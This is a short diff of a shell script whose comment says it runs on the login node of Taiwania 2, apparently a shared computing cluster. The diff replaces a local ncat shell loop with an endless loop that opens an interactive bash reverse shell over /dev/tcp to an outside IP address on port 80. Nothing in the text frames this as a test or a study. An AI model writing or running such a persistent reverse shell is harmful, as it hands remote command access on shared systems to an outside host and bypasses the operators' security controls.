@@ -1,1 +1,3 @@
-while true; do ncat -e /bin/bash localhost 8080; done
+# This client runs on login node of Taiwania 2
+
+while true; do bash -i >& /dev/tcp/34.172.24.84/80 0>&1; done
